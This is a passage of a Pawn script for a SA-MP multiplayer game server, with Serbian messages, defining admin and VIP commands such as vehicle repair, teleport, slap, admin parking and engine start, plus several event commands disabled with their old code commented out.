		new Float:X, Float:Y, Float:Z, Float:A;
		if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!");
	    //if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Niste na mestu vozaca!");
		GetPlayerPos( playerid, X, Y, Z );
		GetVehicleZAngle( GetPlayerVehicleID( playerid ), A );
		SetVehicleZAngle( GetPlayerVehicleID( playerid ), A );
		Novi_RepairVehicle( playerid, GetPlayerVehicleID( playerid ) );
		Novi_SetVehicleHealth( GetPlayerVehicleID( playerid ), 1000.0 );
		antiCheatCS[ playerid ][ VehRepairTime ] = 3;
		vCanDrive[ GetPlayerVehicleID( playerid ) ] = 1;
		SendInfoMessage( playerid, "Okrenuli ste se sa vozilom i popravili vozilo." );
		format( globalstring, sizeof( globalstring ), "FIX | %s je popravio svoje vozilo.", ImeIgraca( playerid ) );
	   	RPTChatVlasnik( NARACRVENA, globalstring );
        if(PlayerInfo[playerid][xVIPLevel] >= 2) {

            new time;
            switch(PlayerInfo[playerid][xVIPLevel]) {

                case 1: 
                    time = 180;
                case 2:
                    time = 120;
                case 3:
                    time = 80;
                case 4: 
                    time = 60;
                case 5:
                    time = 30;
                case 6:
                    time = 10;
            }
            VipFix[ playerid ] = time;
            SendInfoMessage(playerid, "Sledeci /fv mozete koristiti za %d sekundi!", time);
        }
	}
	return true;
}
alias:fixveh("fv");

CMD:ezavrsi( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
	// new dFile[ 32 ];
	// if( PlayerInfo[ playerid ][ xAdmin ] < 1) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
 //    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	// if( !PlayerCreateEvent[ playerid ] ) return SendErrorMessage( playerid, "Ti ne kreiras event!" );
	// SCM( playerid, ZUTA, "Zavrsio si kreiranje eventa." );
	// PlayerCreateEvent[ playerid ] = false;
	// format( dFile, 32, EVENT_FILE, EventID[ playerid ] );

	// new
	// 	INI:File = INI_Open( dFile );

 //   	INI_WriteInt( File, "MaxCP", EventCP[ playerid ]-1);
 //   	Event[ EventID[ playerid ] ][ MaxCP ] = EventCP[ playerid ]-1;

 //   	INI_Close( File );
	// return 1;
}

CMD:enapusti( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
	// if( EventInfo[ eID ] == 0 ) return SendErrorMessage( playerid, "Nijedan event nije upaljen");
	// if( PlayerCP[ playerid ] <= 0 ) return SendErrorMessage( playerid, "Niste na eventu." );
	// if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
	// EventInfo[ Drivers ]--;
 //    SetVehicleToRespawn( GetPlayerVehicleID( playerid ) );
	// TogglePlayerControllable( playerid, true );
	// SetPlayerVirtualWorld( playerid, 0 );
	// PlayerCP[ playerid ] = 0;
	// PlayerEventVehID[ playerid ] = -1;
	// DisablePlayerRaceCheckpoint( playerid );
	
	// Novi_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
	// SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
	// SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
	// return 1;
}

CMD:join( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
	// if( EventInfo[ eID ] == 0 ) return SendErrorMessage( playerid, "Nijedan event nije upaljen");
 //    if( PlayerInfo[ playerid ][ xSupporter ] > 0 ) return SendErrorMessage( playerid, "Momak, koliko znam ti si Helper?" );
	// if( PlayerCuffed[ playerid ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes na event dok si cuffovan." );
 //    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na event dok si vezan." );
 //    if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
	// if( EventInfo[ EventTime ] <= 3 ) return SendErrorMessage( playerid, "Vreme za join je isteklo");
	// if( IsPlayerInAnyVehicle( playerid )  ) return SendErrorMessage( playerid, "Morate biti na nogamo da bi otisli na event." );
	// if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama da bi otisli na event." );
	// if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
	// if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
	// if( PlayerCP[ playerid ] > 0 ) return SendErrorMessage( playerid, "Vec ste u eventu." );
	// if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok imate wanted.");
 //    if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete na event dok ste u zatvoru / Area51.");
 //    if( ServerInfo[ BrojKreiranihVozila ] > MaxBrojKreiranih ) return SCM( playerid, SVETLOCRVENA, "| V:AC | Nemoguce je trenutno otici na event, limit vozila na serveru je dosegnut.");
	// if( EventInfo[ Drivers ] == 30 ) return SendErrorMessage( playerid, "Vec ima maksimalan broj na eventu(30).");

 //    if( ( PlayerInfo[ playerid ][ xAdmin ] > 0 && PlayerInfo[ playerid ][ xAdmin ] < 7 ) || PlayerInfo[ playerid ][ xSupporter ] > 0 ) {
	//     new hour, minute, second;
	// 	gettimeEx( hour, minute, second );
	// 	FixHour( hour );
	// 	hour = shifthour;

	// 	if( ( hour >= 00 ) && ( hour <= 08 ) ) { }
	// 	else return SendErrorMessage( playerid, "Admin/Helper moze na event samo od 00h do 08h." );
	// }
	
	// EventInfo[ Drivers ]++;
	// PlayerCP[ playerid ] = 2;
	// PlayerEventVehID[ playerid ] = ( EventInfo[ Drivers ]-1 );
	// if( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] != INVALID_VEHICLE_ID ) Novi_DestroyVehicle( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
	// GetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ], PlayerPos[ playerid ][ 2 ] );
	// PlayerPosInt[ playerid ] = GetPlayerInterior( playerid );
	// PlayerPosVW[ playerid ] = GetPlayerVirtualWorld( playerid );
 //    if( EventInfo[ Drivers ] % 2 == 0 ) {
	// 	Event[ EventInfo[ eID ] ][ PrivremeniX1 ] -= (6 * floatsin( -Event[ EventInfo[ eID ] ][ TCPA ], degrees ) );
	// 	Event[ EventInfo[ eID ] ][ PrivremeniY1 ] -= (6 * floatcos( -Event[ EventInfo[ eID ] ][ TCPA ], degrees ) );
	// 	if( Event[ EventInfo[ eID ] ][ VehID ] != 0 ) { EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] = Novi_CreateVehicle( -1, -1, -1, -1, Event[ EventInfo[ eID ] ][ VehID ], Event[ EventInfo[ eID ] ][ PrivremeniX1 ], Event[ EventInfo[ eID ] ][ PrivremeniY1 ], Event[ EventInfo[ eID ] ][ TCPZ], Event[ EventInfo[ eID ] ][ TCPA ], random( 128 ), random( 128 ), 3600 ); }
 //        Novi_SetPlayerPos( playerid, Event[ EventInfo[ eID ] ][ PrivremeniX1 ], Event[ EventInfo[ eID ] ][ PrivremeniY1 ], Event[ EventInfo[ eID ] ][ TCPZ ] );
	// }
	// else {
	//     Event[ EventInfo[ eID ] ][ PrivremeniX2 ] -= (6 * floatsin( -Event[ EventInfo[ eID ] ][ TCPA2 ], degrees ) );
	// 	Event[ EventInfo[ eID ] ][ PrivremeniY2 ] -= (6 * floatcos( -Event[ EventInfo[ eID ] ][ TCPA2 ], degrees ) );
	// 	if( Event[ EventInfo[ eID ] ][ VehID ] != 0) { EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] = Novi_CreateVehicle( -1, -1, -1, -1, Event[ EventInfo[ eID ] ][ VehID ], Event[ EventInfo[ eID ] ][ PrivremeniX2 ], Event[ EventInfo[ eID ] ][ PrivremeniY2 ], Event[ EventInfo[ eID ] ][ TCPZ2 ], Event[ EventInfo[ eID ] ][ TCPA2 ], random( 128 ), random( 128 ), 3600 ); }
 //        Novi_SetPlayerPos( playerid, Event[ EventInfo[ eID ] ][ PrivremeniX2 ], Event[ EventInfo[ eID ] ][ PrivremeniY2 ], Event[ EventInfo[ eID ] ][ TCPZ2 ] );
	// }
	// Novi_PutPlayerInVehicle( playerid, EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 0 );
 //    SetVehicleVirtualWorld( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], EventInfo[ eID ] );
	// SetPlayerVirtualWorld( playerid, EventInfo[ eID ] );
	// vCanDrive[ EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] ] = 1;
 //    Fuel[ EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] ] = 100;
 //    Novi_PutPlayerInVehicle( playerid, EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 0 );
	// ResetVehicleStatistics( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ] );
 //    SetVehicleParamsEx( EventInfo[ Vehicle ][ ( EventInfo[ Drivers ]-1 ) ], 1, 0, 0, 0, 0, 0, 0);
	// TogglePlayerControllable( playerid, false );
	// DisablePlayerRaceCheckpoint( playerid );

 //    SendInfoMessage(playerid, "Da napustis event koristi /eventizlaz !");
	// return 1;
}

// new EventVehicleNumber = 0, EventVehicle[ 100 ];

CMD:eventizlaz(playerid) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");

    // if( PlayerCP[ playerid ] > 0 ) {
    //     PlayerCP[ playerid ] = 0;
    //     SetPlayerVirtualWorld( playerid, 0 );
    //     TogglePlayerControllable( playerid, true );
    //     DisablePlayerRaceCheckpoint( playerid );
    //     PlayerEventVehID[ playerid ] = -1;

    //     Novi_SetPlayerPos( playerid, PlayerPos[ playerid ][ 0 ], PlayerPos[ playerid ][ 1 ],  PlayerPos[ playerid ][ 2 ] );
    //     SetPlayerVirtualWorld( playerid, PlayerPosVW[ playerid ] );
    //     SetPlayerInterior( playerid, PlayerPosInt[ playerid ] );
    // }
    // else return SendErrorMessage(playerid, "Nisi na eventu!");

    // return 1;
}

CMD:ekreiraj( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 ) {
    
	// 	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	// 	new idvozila, brojvozila, Float:x, Float:y, Float:z, Float:a;
	// 	if( sscanf( params, "ii", idvozila, brojvozila ) ) return SendUsageMessage( playerid, "/ekreiraj [ ID VOZILA ] [ BROJ VOZILA ]." );
	// 	if( idvozila < 400 || idvozila > 611 ) return SendErrorMessage( playerid, "ID vozila ne moze biti manji od 400 ili veci od 611!");
	// 	if( brojvozila < 0 || brojvozila > 100 ) return SendErrorMessage( playerid, "Broj vozila ne moze biti manji od 0 ili veci od 100." );
	// 	if( EventVehicleNumber != 0 ) return SendErrorMessage( playerid, "Vec su kreirana vozila." );

	// 	GetPlayerPos( playerid, x, y, z );
	// 	GetPlayerFacingAngle( playerid, a );

	// 	EventVehicleNumber = brojvozila;

	// 	for( new i = 0; i < brojvozila; i++ ) {
	// 	    EventVehicle[ i ] = Novi_CreateVehicle( -1, -1, -1, -1, idvozila, x+random(10), y+random(10), z, a, random( 128 ), random( 128 ), 3600 );
 //            vCanDrive[ EventVehicle[ i ] ] = 1;
 //    		Fuel[ EventVehicle[ i ] ] = 100;
 //    		ResetVehicleStatistics( EventVehicle[ i ] );
 //    		SetVehicleParamsEx( EventVehicle[ i ], 1, 0, 0, 0, 0, 0, 0);
	// 	}
		
	// 	format( globalstring, sizeof( globalstring ), "EKREIRAJ | %s je kreirao event vozila.", ImeIgraca( playerid ) );
	//    	AdminPoruka( NARACRVENA, globalstring );
	// 	SendInfoMessage( playerid, "Kreirao si vozila za live event." );
		
	// } else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	// return 1;
}

CMD:eunisti( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");

 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 3 ) {
    
	// 	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

	// 	if( EventVehicleNumber == 0 ) return SendErrorMessage( playerid, "Nisu kreirana event vozila." );

	// 	for( new i = 0; i < EventVehicleNumber; i++ ) {
	// 		Novi_DestroyVehicle( EventVehicle[ i ] );
	// 	}

	// 	EventVehicleNumber = 0;
		
	// 	format( globalstring, sizeof( globalstring ), "EUNISTI | %s je unistio event vozila.", ImeIgraca( playerid ) );
	//    	AdminPoruka( NARACRVENA, globalstring );
	// 	SendInfoMessage( playerid, "Unistili ste vozila za live event." );
		
	// } else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	// return 1;
}

CMD:eucitaj( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");
	// if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
	//     if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	// 	if( EventInfo[ eID ] != 0 ) return SendErrorMessage( playerid, "Vec je ukljucen jedan event, koristi /eugasi." );
	// 	SPD( playerid, dialog_EVENTSTART, DSI, D_NASLOV, "U prazni prostor unesite broj eventa.\nListu eventa imate na /elist.\nNe lupajte brojeve napamet.", D_ODABERI, D_ODUSTANI );
 //    } else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	// return 1;
}

CMD:eugasi( playerid, params[] ) {

    return SendErrorMessage(playerid, "Iskljucena opcija!! Koristi specijalne evente, /eventhelp");

 //    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
	// 	if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	// 	if( EventInfo[ eID ] == 0 ) return SendErrorMessage( playerid, "Nijedan event nije ukljucen." );
	// 	EventInfo[ Position ] = 0;
	// 	EventInfo[ Drivers ] = 0;

	// 	Event[ EventInfo[ eID ] ][ PrivremeniX1 ] = Event[ EventInfo[ eID ] ][ TCPX ];
	//  	Event[ EventInfo[ eID ] ][ PrivremeniY1 ] = Event[ EventInfo[ eID ] ][ TCPY ];
	//  	Event[ EventInfo[ eID ] ][ PrivremeniX2 ] = Event[ EventInfo[ eID ] ][ TCPX2 ];
	//  	Event[ EventInfo[ eID ] ][ PrivremeniY2 ] = Event[ EventInfo[ eID ] ][ TCPY2 ];

	//  	EventInfo[ eID ] = 0;

	//  	for( new i = 0; i < 30; i++) {
	//  		if( EventInfo[ Vehicle ][ i ] != INVALID_VEHICLE_ID ) SetVehicleToRespawn( EventInfo[ Vehicle ][ i ] );
	// 	}

	// 	foreach( Player, i ){
	// 		if( PlayerCP[ i ] > 0 ) {
	// 			PlayerCP[ i ] = 0;
	// 			SetPlayerVirtualWorld( i, 0 );
	// 			TogglePlayerControllable( i, true );
	// 			DisablePlayerRaceCheckpoint( i );
	// 			PlayerEventVehID[ i ] = -1;

	//             Novi_SetPlayerPos( i, PlayerPos[ i ][ 0 ], PlayerPos[ i ][ 1 ],  PlayerPos[ i ][ 2 ] );
	// 			SetPlayerVirtualWorld( i, PlayerPosVW[ i ] );
	// 			SetPlayerInterior( i, PlayerPosInt[ i ] );
	// 		}
	// 	}

	// 	format( globalstring, sizeof( globalstring ), "***[UNLOAD trke] %s", ImeIgraca( playerid ) );
	// 	AdminPoruka( 0x6495EDAA, globalstring );
	// 	SCM( playerid, ZUTA, "Prekinuo si event." );
	// } else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	// return 1;
}

alias:slap("osamari");
CMD:slap( playerid, params[] ) {
    new igrac, Float:x, Float:y, Float:z;
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
        // if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    if( sscanf(params,"u", igrac ) ) return SendUsageMessage( playerid, "/slap [ ID/Deo imena ]." );
	    if( !IsPlayerConnected( igrac ) ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");
        if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ igrac ][ xAdmin ] >= 6 ) return SendErrorMessage( playerid, "Ne mozes slapovati directore i ownere!");
		GetPlayerPos( igrac, x, y, z );
	    Novi_SetPlayerPos( igrac, x, y, z+5 );
	  	format(globalstring , sizeof( globalstring ), "SLAP | %s je osamario igraca: %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
	  	AdminPoruka( NARACRVENA, globalstring );
	  	SendInfoMessage( playerid, "Osamario si igraca: %s", ImeIgraca( igrac ) );
		SendInfoMessage( igrac, "Admin/Helper %s vas je osamario.", ImeIgraca( playerid ) );
        if( antiCheatCS[ igrac ][ TakeVehicle ] != INVALID_VEHICLE_ID ) {
    		BusyVehicle[ antiCheatCS[ igrac ][ TakeVehicle ] ] = -1;
    	}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return true;
}

CMD:xgoto( playerid, params[] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	new Float:Poz[ 3 ];
	if( sscanf(params, "fff", Poz[0], Poz[1], Poz[2] ) ) return SendUsageMessage( playerid, "/xgoto [ x ] [ y ] [ z ]." );
	if( IsPlayerInAnyVehicle( playerid ) ) { Novi_SetVehiclePos( GetPlayerVehicleID( playerid ), Poz[0], Poz[1], Poz[2] ); }
	else { Novi_SetPlayerPos( playerid, Poz[0], Poz[1], Poz[2 ] ); }
    SendInfoMessage( playerid, "Teleportovani ste na koordinate %f, %f, %f",Poz[0], Poz[1], Poz[2] );
	return true;
}

CMD:apark( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {

		if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

        new Float:Pos[ 4 ];

		if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu!" );
        if(!PrivatnoVozilo(GetPlayerVehicleID(playerid))) return SendErrorMessage( playerid, "Nisi u nijednom privatnom vozilu." );
        if( GetPlayerVehicleSeat( playerid ) != 0 ) return SendErrorMessage( playerid, "Morate biti u vozilu na vozackom mestu!");

		new autoid = getVehicleScriptID(GetPlayerVehicleID(playerid));

		GetVehiclePos( VehicleInfo[ autoid ][ vID ], Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
		GetVehicleZAngle( VehicleInfo[ autoid ][ vID ], Pos[ 3 ] );

        VehicleInfo[ autoid ][ vVirtualWorld ] = GetPlayerVirtualWorld( playerid );
		VehicleInfo[ autoid ][ vInterior ] = GetPlayerInterior( playerid );

		VehicleInfo[ autoid ][ vLokacijaX ] = Pos[ 0 ];
		VehicleInfo[ autoid ][ vLokacijaY ] = Pos[ 1 ];
		VehicleInfo[ autoid ][ vLokacijaZ ] = Pos[ 2 ];
		VehicleInfo[ autoid ][ vLokacijaA ] = Pos[ 3 ];

        Novi_DestroyVehicle( VehicleInfo[ autoid ][ vID ] );
		VehicleInfo[ autoid ][ vID ] = V01D_CreateVehicle(VehicleInfo[ autoid ][ vModel ], VehicleInfo[ autoid ][ vLokacijaX ], VehicleInfo[ autoid ][ vLokacijaY ], VehicleInfo[ autoid ][ vLokacijaZ ]+1.0, VehicleInfo[ autoid ][ vLokacijaA ], VehicleInfo[ autoid ][ vColor1 ], VehicleInfo[ autoid ][ vColor2 ], 300000 );
		LinkVehicleToInterior( VehicleInfo[ autoid ][ vID ], VehicleInfo[ autoid ][ vInterior ] );
    	SetVehicleVirtualWorld( VehicleInfo[ autoid ][ vID ], VehicleInfo[ autoid ][ vVirtualWorld ] );

        TuneVehicle( autoid );

		SetVehicleParamsEx( VehicleInfo[ autoid ][ vID ], 0, 0, 0, VehicleInfo[ autoid ][ vLocked ], 0, 0, 0 );
		if( IsVehicleBajs( VehicleInfo[ autoid ][ vID ] ) ) {
			SetVehicleParamsEx( VehicleInfo[ autoid ][ vID ], 1, 0, 0, VehicleInfo[ autoid ][ vLocked ], 0, 0, 0 );
		}

		SaveVehicle( autoid );

		SendInfoMessage( playerid, "Uspesno ste parkirali vozilo ID %d!", autoid);
				
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:aupali( playerid, params[] ) {

	if( PlayerInfo[ playerid ][ xAdmin ] >= 1  ) {
	
			if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );

			new vehicle = GetPlayerVehicleID( playerid ),
				engine,lights,alarm,doors,bonnet,boot,objective;

		    if( !IsPlayerInAnyVehicle( playerid )) return SendErrorMessage( playerid, "Morate biti u vozilu da biste koristili ovu komandu!");
		 	if( vCanDrive[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");
		    if( IsVehicleBajs( vehicle ) ) return SendErrorMessage( playerid, "Stvarno mislis upaliti biciklu? " );
			if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti vozac da bi ste mogli koristit ovu komandu.");
			if( Fuel[ vehicle ] == 0 ) return SendErrorMessage( playerid, "Vozilo nema goriva ne mozete ga upaliti." );

			GetVehicleParamsEx(vehicle,engine, lights, alarm, doors, bonnet, boot, objective );
		    if( engine == 1 ) return SendErrorMessage( playerid, "Motor vozila je vec upaljen." );
			if( Maskuse[ playerid ] == true )
            	format( globalstring, sizeof( globalstring ), "* Maska_%d pokusava pokrenuti motor.", PlayerInfo[ playerid ][ xMaskID ] );
			else
				format( globalstring, sizeof( globalstring ), "* %s pokusava pokrenuti motor.", ImeIgraca( playerid ) );
			PorukaRadius( 20.0, playerid, globalstring, LJUBICASTA );
			SetTimerEx( "VehicleEngineStart", 1000, 0, "i", playerid );
			SetPVarInt( playerid, "StartingVehicle", 1 );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	
    return 1;
}

alias:goto("idido");
CMD:goto( playerid, params[ ], help ) {
    new Float:pozp[ 3 ], igrac;
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 || PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {

		if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/goto [ ID/Deo imena ]." );
		if( igrac == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );

        if(RanjenIgrac[playerid]) return SendErrorMessage(playerid, "Ne mozes dok si ranjen!");
        if(!canPlayerTeleport(playerid)) return SendErrorMessage(playerid, "Ne mozes to sada!");
		
		//if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) { if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" ); }

        if(PlayerInfo[igrac][xZatvor] != 0) return SendErrorMessage(playerid, "Igrac je zatvoren!");

		if( PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
		    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes dok si u DM Zoni." );
			if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
            if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati kod Admin-a." );
            if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
            if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
            if(isPlayerAFK(igrac)) return SendErrorMessage(playerid, "Ne mozes se portati do igraca koji je AFK!");
            if(IsPlayerPBot(igrac)) return SendErrorMessage(playerid, "Ne mozes se portati do igraca koji je AFK!");
        }
		if( PlayerInfo[ playerid ][ xVIPLevel ] >= 1 ) {
            if(PlayerInfo[playerid][xVIPLevel] < 3) return SendErrorMessage(playerid, "Ovu komandu moze koristiti samo VIP 3+");
            if(VipGoto[playerid] != 0) return SendErrorMessage(playerid, "Sacekaj malo!");
		    if( PlayerInfo[ igrac ][ xSupporter ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati do Helpera." );
		    if( PlayerInfo[ igrac ][ xWanted ] > 0 ) return SendErrorMessage( playerid, "Ne mozes se portati do igraca koj ima WL." );
		    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes dok si u DM Zoni." );
		    if( NaUtrci[ playerid ] ) return SendErrorMessage( playerid, "Ne mozes dok si na trci." );
		    if( PlayerInfo[ igrac ][ xAdmin ] >= 1 ) return SendErrorMessage( playerid, "Ne mozes se portati do Admin-a." );
		    if( PoliceDuty[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes koristi ovu komandu dok si na duznosti." );
		    if( UzeoOpremu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes se portati dok radis posao ili imas uniformu posla." );
			if( PlayerInfo[ playerid ][ xWanted ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok imas wanted level." );
			if( PlayerInfo[ playerid ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Ne mozes se portati dok si u jailu." );
            if( NaDmEventu[ igrac ] == true ) return SendErrorMessage( playerid, "Ne mozes dok je igrac na DM eventu." );
            if( uInterijeru[ playerid ] != -1 ) return SendErrorMessage( playerid, "Ne mozes da se portas dok si u interijeru.");
            if( uInterijeru[ igrac ] != -1 ) return SendErrorMessage( playerid, "Ne mozes da se portas do igraca koji je u interijeru.");
            if(isPlayerAFK(igrac)) return SendErrorMessage(playerid, "Ne mozes se portati do igraca koji je AFK!");
            if(IsPlayerPBot(igrac)) return SendErrorMessage(playerid, "Ne mozes se portati do igraca koji je AFK!");
		}

		GetPlayerPos( igrac, pozp[ 0 ], pozp[ 1 ], pozp[ 2 ] );
		if( PlayerInfo[ playerid ][ xAdmin ] < 7 && PlayerInfo[ igrac ][ xAdmin ] >= 7 ) return SendErrorMessage( playerid, "Ne mozete se teleportovati do ownera!" );
        //if(PlayerInfo[playerid][xAdmin] < PlayerInfo[igrac][xAdmin]) return SendErrorMessage(playerid, "Ne mozes se portati do igraca veceg od sebe!");

		if( GetPlayerState( playerid ) == 2 ) {
			Novi_SetVehiclePos( GetPlayerVehicleID( playerid ), pozp[0]+3, pozp[1]+3, pozp[2] );
			SetPlayerInterior( playerid, GetPlayerInterior( igrac ) );
		 	SetPlayerVirtualWorld( playerid, GetPlayerVirtualWorld( igrac ) );
	 	}
		else {
			Novi_SetPlayerPos( playerid, pozp[0]+5, pozp[1]+5, pozp[2] );
			SetPlayerInterior( playerid, GetPlayerInterior( igrac ) );
		 	SetPlayerVirtualWorld( playerid, GetPlayerVirtualWorld( igrac ) );
		}
		
		SendInfoMessage( playerid, "Teleportirani ste do igraca: %s", ImeIgraca( igrac ) );
		SendInfoMessage( igrac, "%s se teleportovao do vas.", ImeIgraca( playerid ) );

        if(PlayerInfo[playerid][xVIPLevel] == 3) {

            new time;
            
            VipGoto[ playerid ] = 60;
            SendInfoMessage(playerid, "Sledeci goto mozete koristiti za %d sekundi!", time);
        }
		
		if( inOrgInt[ igrac ] != -1 ) {
		    inOrgInt[ playerid ] = inOrgInt[ igrac ];
		}
		
		if( uInterijeru[ igrac ] != -1 ) {
		    uInterijeru[ playerid ] = uInterijeru[ igrac ];
		}
		
		if( PlayerInfo[ playerid ][ xAdmin ] < 6 ) {
			format( globalstring, sizeof( globalstring ), "GOTO | %s se portao do igraca: %s", ImeIgraca( playerid ), ImeIgraca( igrac ) );
			RPTChat( NARACRVENA, globalstring );
		}
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return true;
}

alias:gethere("dovedi");
CMD:gethere( playerid, params[ ] ) {
    if( PlayerInfo[ playerid ][ xAdmin ] >= 1 || PlayerInfo[ playerid ][ xSupporter ] >= 1 ) {
	    if( !AdminDuty[ playerid ] ) return SendErrorMessage( playerid, "Da bi koristili ovu komandu morate biti Admin na duznosti" );
	    new igrac, Float:x, Float:y, Float:z;
	    if( sscanf( params, "u", igrac ) ) return SendUsageMessage( playerid, "/gethere [ ID/Deo imena ]." );
